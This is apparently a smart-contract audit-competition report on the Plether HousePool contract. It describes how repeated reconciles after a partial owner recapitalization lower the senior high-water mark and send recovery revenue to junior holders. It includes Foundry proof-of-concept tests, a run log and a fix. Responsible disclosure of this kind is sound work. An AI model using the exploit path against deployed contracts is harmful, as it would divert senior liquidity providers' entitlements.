# \#99089 [SC-High] Partially settled owner recapitalization is settled again on every later reconcile, lowering the senior high-water mark

**Submitted on Nov 11th 2026 at 20:15:23 UTC by @Valisthea for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99089
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

`CfdEngine.recapitalizePool` queues the owner's injection in `HousePool.pendingRecapitalizationAssets`. When the
pool is in terminal deficit, only part of that amount is backed by distributable equity, so the first reconcile
settles that part into senior principal and keeps the rest pending. On every later reconcile the pending residual is
capped against **total** distributable equity, although that equity already backs the senior principal created by
the first settlement. The reconcile plan then finds no equity behind the existing senior principal, books it as a
loss, and re-applies the residual through the empty-pool bootstrap branch, which overwrites `seniorHighWaterMark`
with a smaller value. No cash, claim, mark or position has to change between the two reconciles.

The result is that the senior tranche loses the restoration target the recapitalization gave it, and later trading
revenue is credited to junior principal instead of restoring senior.

Severity: **Low**. No deposited principal is taken, and the precondition is a terminal deficit, which at the
documented release parameters requires an extreme two-way price path. See "Preconditions and likelihood".

- Scope: `packages/perps/src/HousePool.sol`, `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol`,
  `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol`
- Commit: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## Vulnerability details

Notation: `R` is the recapitalization amount, `h` the hole (trader claims minus pool cash before the injection),
`D = R - h` the distributable equity after it.

**Step 1, the cap.** The settleable part of the pending bucket is capped against total distributable equity:

```solidity
// HousePool.sol:1829-1834
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (...) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

**Step 2, the plan.** `planReconcile` removes that amount from distributable equity before comparing equity with
claimed principal, and books any shortfall as a loss:

```solidity
// HousePoolReconcilePlanLib.sol:68-71
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
// ...:102-103
plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
```

Its own NatSpec states the precondition: `pendingBucketAssets` are assets "already represented in
`snapshot.distributable`". That holds on the first reconcile. It does not hold afterwards: the residual `h` is not
in `D` at all, and the whole of `D` already backs the senior principal the first reconcile created.

**Step 3, the bootstrap.** When the loss takes senior principal to zero, the recapitalization is applied through
the empty-pool branch, which sets the high-water mark from the *remaining* intent:

```solidity
// HousePoolPendingPreviewLib.sol:118-122
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
```

`recapitalizationTargetAssets` is the pending bucket at that moment, i.e. the residual, not `R`.

### Walkthrough

Numbers of the vendor's own fixture (`HousePoolWaterfall.t.sol:177-220`): wiped pool, `R = 100,000`,
`h = 50,040`, so `D = 49,960`.

| Step | Senior principal | Senior high-water mark | Pending recapitalization | Junior principal | Unassigned |
|---|---|---|---|---|---|
| Reconcile 1 | 49,960 | 100,000 | 50,040 | 0 | 0 |
| Reconcile 2, nothing changed | 49,960 | **50,040** | **80** | 0 | 0 |
| Backing arrives (`D = 100,000`) | 50,040 | 50,040 | 0 | **49,880** | 80 |
| Same, without reconcile 2 | 100,000 | 100,000 | 0 | 0 | 0 |

In reconcile 2 the settleable amount is `min(50,040, 49,960) = 49,960`. The plan subtracts it from `D`, sees zero
equity behind 49,960 of senior principal, writes senior to zero, and the bootstrap branch then recreates 49,960 of
senior principal with a high-water mark of `max(50,040, 49,960) = 50,040`.

### When it bites

The high-water mark decays exactly when the hole is at least half of the recapitalization (`h >= R/2`, equivalently
`D <= h`). Below that threshold a later reconcile still consumes the pending residual, but senior principal stays
above zero, the bootstrap branch is not taken, and the high-water mark is intact.

The trigger is not limited to an idle reconcile: any committed reconcile while distributable equity is at or below
the pending residual takes the same path, including one that follows partial revenue. (Derived from the code; the
tests below exercise the idle case.)

### How a reconcile is committed in production

`HousePool.reconcile()` is `onlyVault` and no in-scope contract calls it. A reconcile is committed by
`HousePool.settleLpEpoch`, which is permissionless when no position is open and reverts unless the pass makes
progress (`_emitLpEpochSettled`, `HousePool.sol:1183-1185`). In this state junior principal is zero, so a
full-balance junior redemption request prices to zero, is refunded, and counts as progress
(`_fundRedemptionPhase`, `HousePool.sol:960-986`). Any junior holder can therefore commit one reconcile per epoch.

## Preconditions and likelihood

Stated plainly, because they set the severity:

1. **Terminal deficit.** Trader claims must exceed pool cash, which means both tranches are already wiped. The
   engine reserves the larger side's maximum profit at open, so a deficit needs one side to be paid at one extreme
   and the other side to win at the opposite extreme. The proof of concept uses a mark path of 1.00 -> 1.90 -> 0.10.
   I could not construct a milder path. For a six-currency dollar basket this has no historical precedent.
2. **An owner recapitalization of at most twice the hole.** The call is the documented recovery procedure, not a
   malicious action. An owner who injects more than `2h` does not trigger the decay.
3. At least one further committed reconcile before enough revenue arrives to back the residual.

## Impact

- **Who loses.** Senior liquidity providers. They lose restoration priority over later revenue, up to `h`.
- **Who gains.** Holders of junior shares, which are worth zero after the wipe-out.
- **What is not lost.** No deposited principal. Senior principal was already lost to the market before the
  recapitalization; what is redirected is the entitlement the owner's injection was meant to create.

Measured on the production-path proof of concept (release risk parameters, amounts in USDG):

| | One reconcile after the recapitalization | Three reconciles with nothing changed |
|---|---|---|
| Hole covered | 94,473.40 | 94,473.40 |
| Recapitalization paid by the owner | 141,710.11 | 141,710.11 |
| Senior high-water mark before recovery revenue | 141,710.11 | 47,236.70 |
| Senior principal after 109,697.69 of trading revenue | 141,710.11 | 47,236.70 |
| Senior LP share value | 141,427.25 | 47,142.42 |
| Cash redeemed by the junior LP | 0 | 109,588.60 |
| Unassigned assets | 15,224.28 | 0 |

The senior LP ends 94,284.83 lower. Of the junior LP's 109,588.60, about 94,400 is revenue that would have restored
senior; the remaining 15,224.28 is recapitalization remainder that the first column leaves unassigned.

## Why this is not intended or already known

- The vendor test `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual`
  (`HousePoolWaterfall.t.sol:177-220`) asserts "Residual recap should preserve senior's recovery target" (line 201)
  and "Residual recap should settle once backing becomes available" (line 217). It runs a single reconcile before
  the backing appears. One more reconcile makes both statements false.
- `ACCOUNTING_SPEC.md:339-340`: reserving the pending buckets "prevents counting the same inflow twice".
- The `planReconcile` NatSpec precondition quoted above.
- Prior audit (2026-10-26): MED-12 concerns revenue continuation in the same batch as a recapitalization; LOW-22
  concerns the missing recapitalization entrypoint. Neither describes a second settlement of a partially settled
  recapitalization. `recapitalizePool` did not exist at the audited commit.
- Not listed in `SECURITY.md` Known Limitations or in `audits/scan-plether-fi-plether-core-d4541b49.md`.

## Recommended fix

Only equity that no claim already owns can back a pending inflow. Cap the settleable pending bucket against
distributable equity net of senior principal, junior principal and unassigned assets, instead of against total
distributable equity:

```solidity
uint256 claimed = seniorPrincipal + juniorPrincipal + unassignedAssets;
uint256 unclaimedEquity = distributable > claimed ? distributable - claimed : 0;
settleable = HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, unclaimedEquity);
```

The same value has to be used by the preview path (`_buildHousePoolContext`) so that preview and live reconcile
stay aligned.

Checked on the symbolic model only, with this change applied to the glue: for any hole, a reconcile with nothing
changed leaves the high-water mark, senior principal and pending residual untouched, and once backing for the
residual arrives senior principal reaches the recapitalization target with nothing credited to junior (halmos,
2 properties proven). It was not applied to `HousePool` or run against the vendor suite. One behaviour to review
before adopting it: when the stored principals are stale at the first reconcile (the wipe-out has not been
reconciled yet), this cap settles nothing on that pass, so senior principal is written down rather than to zero and
the bootstrap reset of the high-water mark does not occur.

A regression test is the vendor test above with one additional `pool.reconcile()` before the liability is cleared.

## Proof of Concept

## Proof of concept

Two self-contained Foundry tests against the scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Both were compiled and run on 2026-11-11; the run log is at the end.

Save the files under `packages/perps/test/perps/accounting/close/` and run:

```bash
forge test --root packages/perps --match-path 'test/perps/accounting/close/RecapResidualRecount*.t.sol' -vv
```

Expected: 4 tests pass. The two `Control` tests show the correct outcome (senior fully restored, junior gets nothing); the two others show the defect.

### PoC 1 — minimal case, on the vendor's own fixture

`RecapResidualRecountMinimal.t.sol`. Same setup as the vendor test `HousePoolWaterfall.t.sol:177-220`, with one extra `pool.reconcile()` inserted before the trader-claim liability clears. This fixture is the vendor's: it writes the trader-claim total with a storage write and calls `pool.reconcile()` as a vault. It demonstrates the accounting, not reachability.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "../../shared/HousePoolTestBase.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

contract RecapResidualRecountMinimalTest is HousePoolTestBase {

    function _run(uint256 idleReconciles) private returns (uint256 seniorEnd, uint256 juniorEnd, uint256 hwm) {
        settlementToken.burn(address(pool), pool.totalAssets());
        vm.prank(address(juniorVault));
        pool.reconcile();

        uint256 pendingAmount = 100_000e6;
        uint256 traderClaimLiability = 50_040e6;

        settlementToken.mint(address(pool), pendingAmount);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            pendingAmount, IHousePool.ClaimantInflowKind.Recapitalization, IHousePool.ClaimantInflowCashMode.CashArrived
        );
        _setTotalTraderClaim(traderClaimLiability);

        vm.prank(address(seniorVault));
        pool.reconcile();
        assertEq(pool.seniorHighWaterMark(), pendingAmount, "vendor assert: residual recap preserves the target");

        for (uint256 i = 0; i < idleReconciles; ++i) {
            vm.prank(address(seniorVault));
            pool.reconcile(); // nothing changed since the previous reconcile
        }
        hwm = pool.seniorHighWaterMark();

        _setTotalTraderClaim(0);
        vm.prank(address(seniorVault));
        pool.reconcile();
        seniorEnd = pool.seniorPrincipal();
        juniorEnd = pool.juniorPrincipal();
    }

    function test_Control_NoIdleReconcile() public {
        (uint256 seniorEnd, uint256 juniorEnd, uint256 hwm) = _run(0);
        assertEq(hwm, 100_000e6);
        assertEq(seniorEnd, 100_000e6);
        assertEq(juniorEnd, 0);
    }

    function test_OneIdleReconcile() public {
        (uint256 seniorEnd, uint256 juniorEnd, uint256 hwm) = _run(1);
        assertEq(hwm, 50_040e6, "the high-water mark fell from 100,000 to 50,040");
        assertEq(seniorEnd, 50_040e6, "senior was not restored to 100,000");
        assertEq(juniorEnd, 49_880e6, "junior received what the control gives to senior");
    }

}
```

### PoC 2 — production path at the documented release risk parameters

`RecapResidualRecountProduction.t.sol`. Real trading produces the deficit, the owner calls `recapitalizePool`, and every reconcile is committed through the permissionless `settleLpEpoch`, made to progress by a zero-value junior redemption request that is refunded. Risk parameters are DEPLOYMENT.md's (`vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, maintenance 10 bps, initial 20 bps, carry 500 bps, bounty 10 bps / 1 USDG).

Steps:
1. A senior LP deposits 500,000 and a junior LP 1,000,000 through the asynchronous queues.
2. A short of 600,000 and a long of 1,190,000 open at 1.0000. The mark goes to 1.9000 and the short is paid; the mark goes to 0.1000 and the long closes. Pool cash 976,439.41, trader claim 1,070,912.82: hole 94,473.40.
3. The owner calls `engine.recapitalizePool(141,710.11)` (1.5x the hole) and `engine.clearDegradedMode()`; the trader calls `engine.settleTraderClaim`.
4. One (control) or three reconciles are committed through `pool.settleLpEpoch(0, 0)`.
5. Four losing trades add 109,697.69 of trading revenue, followed by one last epoch in which the junior LP redeems.

What this test does that a real actor could not: trades and marks are installed by impersonating the router address towards `engine.processOrderTyped` and `engine.updateMarkPrice`, as the vendor's own tests do, which skips the commit delay and oracle verification; the settlement token is a mock; and the price path is extreme. `recapitalizePool`, `clearDegradedMode`, `settleTraderClaim`, the vault requests and claims, and `settleLpEpoch` are called by their real callers.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

contract RecapResidualRecountProductionTest is BasePerpTest {

    address private constant SENIOR_LP = address(0x5E01);
    address private constant JUNIOR_LP = address(0x1B01);
    address private constant SHORT_T = address(0x5401);
    address private constant LONG_T = address(0x1001);
    address private constant LOSER = address(0x1053);

    // DEPLOYMENT.md release risk parameters.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _mark(
        uint256 price
    ) private {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(price, SafeCast.toUint64(vm.getBlockTimestamp()));
    }

    function _openNow(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) private {
        uint256 depth = pool.totalAssets();
        vm.prank(address(router));
        engine.processOrderTyped(
            CfdTypes.Order({
                account: account,
                sizeDelta: size,
                marginDelta: margin,
                targetPrice: price,
                commitTime: uint64(vm.getBlockTimestamp()),
                commitBlock: uint64(vm.getBlockNumber()),
                orderId: 0,
                side: side,
                isClose: false
            }),
            price,
            depth,
            uint64(vm.getBlockTimestamp())
        );
    }

    /// One committed reconcile through the permissionless production entrypoint. Junior principal is zero, so a
    /// full-balance junior redemption request prices to zero, is refunded, and counts as epoch progress.
    function _settleViaZeroValueJuniorRefund() private {
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() <= maturity) {
            vm.warp(maturity + 1);
        }
        pool.settleLpEpoch(0, 0);
        if (juniorVault.redeemRefundPending(requestId, JUNIOR_LP)) {
            vm.prank(JUNIOR_LP);
            juniorVault.claimRedeemRefund(requestId, JUNIOR_LP, JUNIOR_LP);
        }
    }

    /// Real trading revenue: a fully collateralised long that loses as the mark doubles.
    function _losingRound(
        uint256 price
    ) private returns (uint256 nextPrice) {
        _mark(price);
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 notional = (depth * 35) / 100;
        uint256 lots = (notional * 1e8) / (price * 100) / 1e6;
        uint256 size = lots * 1e20;
        _fundTrader(LOSER, notional * 2);
        _openNow(LOSER, CfdTypes.Side.LONG, size, (notional * 3) / 2, price);
        nextPrice = price * 2;
        _mark(nextPrice);
        _close(LOSER, CfdTypes.Side.LONG, size, nextPrice, pool.totalAssets());
    }

    /// Returns (hole, recap). Leaves the pool flat, degraded mode cleared, the winner's claim paid.
    function _wipeRecapitalizeAndClear() private returns (uint256 hole, uint256 recap) {
        _fundSenior(SENIOR_LP, 500_000e6);
        _fundJunior(JUNIOR_LP, 1_000_000e6);
        _fundTrader(SHORT_T, 100_000e6);
        _fundTrader(LONG_T, 1_200_000e6);

        _mark(1e8);
        _openNow(SHORT_T, CfdTypes.Side.SHORT, 600_000e18, 60_000e6, 1e8);
        _openNow(LONG_T, CfdTypes.Side.LONG, 1_190_000e18, 1_100_000e6, 1e8);

        // Minority-side winner paid in full, then the mark reverses and the other side wins more than is left.
        _mark(1.9e8);
        _close(SHORT_T, CfdTypes.Side.SHORT, 600_000e18, 1.9e8, pool.totalAssets());
        _mark(0.1e8);
        _close(LONG_T, CfdTypes.Side.LONG, 1_190_000e18, 0.1e8, pool.totalAssets());

        uint256 cash = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        assertGt(claims, cash, "setup must leave a terminal deficit");
        hole = claims - cash;
        recap = (hole * 3) / 2; // 1.5x the hole: covers the deficit, adds half as much again for senior

        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        if (engine.degradedMode()) {
            engine.clearDegradedMode();
        }
        vm.prank(LONG_T);
        engine.settleTraderClaim(LONG_T);
    }

    function _recoverAndMeasure() private returns (uint256 seniorValue, uint256 juniorCashOut) {
        uint256 price = 0.1e8;
        for (uint256 i = 0; i < 4; ++i) {
            price = _losingRound(price);
        }

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() <= maturity) {
            vm.warp(maturity + 1);
        }
        pool.settleLpEpoch(0, 0);

        uint256 walletBefore = settlementToken.balanceOf(JUNIOR_LP);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, JUNIOR_LP);
        if (claimable != 0) {
            vm.prank(JUNIOR_LP);
            juniorVault.claimRedeem(requestId, claimable, JUNIOR_LP, JUNIOR_LP);
        }
        juniorCashOut = settlementToken.balanceOf(JUNIOR_LP) - walletBefore;
        seniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
    }

    function _run(
        uint256 reconcilesBeforeRecovery
    ) private returns (uint256 hwm, uint256 seniorValue, uint256 juniorCashOut) {
        (uint256 hole, uint256 recap) = _wipeRecapitalizeAndClear();
        emit log_named_uint("hole", hole);
        emit log_named_uint("recapitalization", recap);
        for (uint256 i = 0; i < reconcilesBeforeRecovery; ++i) {
            _settleViaZeroValueJuniorRefund();
            emit log_named_uint("senior high-water mark after reconcile", pool.seniorHighWaterMark());
            emit log_named_uint("pending recapitalization after reconcile", pool.pendingRecapitalizationAssets());
        }
        hwm = pool.seniorHighWaterMark();
        (seniorValue, juniorCashOut) = _recoverAndMeasure();
        emit log_named_uint("senior LP share value at the end", seniorValue);
        emit log_named_uint("junior LP cash redeemed at the end", juniorCashOut);
    }

    /// Control: one reconcile after the recapitalization, then recovery.
    function test_Control_OneReconcileThenRecovery() public {
        (, uint256 seniorValue, uint256 juniorCashOut) = _run(1);
        assertEq(juniorCashOut, 0, "control: junior, wiped out, redeems nothing");
        assertGt(seniorValue, 140_000e6, "control: senior is restored to about the recapitalization");
    }

    /// Three reconciles after the recapitalization with nothing else happening, then the same recovery.
    function test_ThreeIdleReconcilesThenRecovery() public {
        (uint256 hwm, uint256 seniorValue, uint256 juniorCashOut) = _run(3);
        assertLt(hwm, 50_000e6, "the high-water mark decayed from about 141,710 to about 47,237");
        assertLt(seniorValue, 50_000e6, "senior was not restored");
        assertGt(juniorCashOut, 100_000e6, "junior redeemed the revenue that should have restored senior");
    }

}
```

### Run log (2026-11-11, scope commit)

```
cmdline: forge test --root packages/perps --match-path 'test/perps/accounting/close/RecapResidualRecount*.t.sol' -vv
Compiler run successful with warnings:
[PASS] test_Control_NoIdleReconcile() (gas: 434415)
[PASS] test_OneIdleReconcile() (gas: 511573)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 35.15ms (13.94ms CPU time)
[PASS] test_Control_OneReconcileThenRecovery() (gas: 8689004)
  hole: 94473404594
  recapitalization: 141710106891
  senior high-water mark after reconcile: 141710106891
  pending recapitalization after reconcile: 94473404594
  senior LP share value at the end: 141427249809
  junior LP cash redeemed at the end: 0
[PASS] test_ThreeIdleReconcilesThenRecovery() (gas: 9805103)
  hole: 94473404594
  recapitalization: 141710106891
  senior high-water mark after reconcile: 141710106891
  pending recapitalization after reconcile: 94473404594
  senior high-water mark after reconcile: 94473404594
  pending recapitalization after reconcile: 47236702297
  senior high-water mark after reconcile: 47236702297
  pending recapitalization after reconcile: 0
  senior LP share value at the end: 47142416603
  junior LP cash redeemed at the end: 109588601805
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 102.14ms (120.34ms CPU time)
exit_code=0
```

Reading of the log: with pool cash constant at 47,236.70 across the three reconciles, the senior high-water mark goes 141,710.11 -> 94,473.40 -> 47,236.70 and the pending recapitalization 94,473.40 -> 47,236.70 -> 0. After the same recovery revenue, the senior LP's share value is 47,142.42 against 141,427.25 in the control, and the junior LP redeems 109,588.60 against 0.

### Additional characterisation (not needed to reproduce)

| Tool | Property | Result |
|---|---|---|
| Foundry fuzz, 256 runs, real `HousePool` | the target decays if and only if `h >= R/2` | passes |
| Foundry stateful invariant | no reconcile with nothing changed lowers the target | fails; shrunk to: recapitalize, set claims, reconcile, reconcile |
| halmos, accounting libraries | `h < R/2`: the target survives | proven over `uint64` inputs |
| halmos | any `h`: the target survives | counterexamples at `h = R/2` and `h = 3R/4` |
| medusa, stateful model, 19,021 calls | no reconcile with nothing changed lowers the target | fails with the same four-call sequence |
